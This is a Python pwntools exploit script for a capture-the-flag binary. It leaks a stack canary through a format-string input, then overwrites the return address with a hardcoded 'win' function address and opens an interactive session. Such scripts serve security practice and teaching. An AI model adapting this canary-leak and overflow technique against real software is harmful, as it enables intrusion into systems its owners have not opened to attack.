from pwn import *
from struct import pack
import time

context.terminal = ['kitty', '@', 'launch', '--keep-focus']

io = gdb.debug('./chall', gdbscript='''
# break main
# break *0x00000000004017c6
# break *0x0000000000401816
# break *0x00000000004018e3
continue
''')

# io = ELF('./chall').process()

io.recvuntil(b'@ ')
line = io.recvline()
ret_addr = line[:line.find(b', ')]
print('ret_addr', ret_addr)

io.recvuntil(b'@ ')
line = io.recvline()
canary_addr = line[:line.find(b'. ')]
print('canary_addr', canary_addr)

io.recvuntil(b'name: ')

io.sendline(b'%11$p')

canary = io.recvline()
canary = canary[canary.find(b', ')+2:canary.find(b'.')]
print('canary', canary)

io.recvuntil(b'input: ')

# win @ 0x401606
win = p64(0x401606)
print('ret', ret_addr)
prev_addr = p64(int(ret_addr, 16)-8)

# 16 bytes garbage
# canary
# win address
# return addr
pwnmsg = b'\x00'*24+p64(int(canary, 16))+b'\x00'*8+win

io.sendline(pwnmsg)

io.interactive()
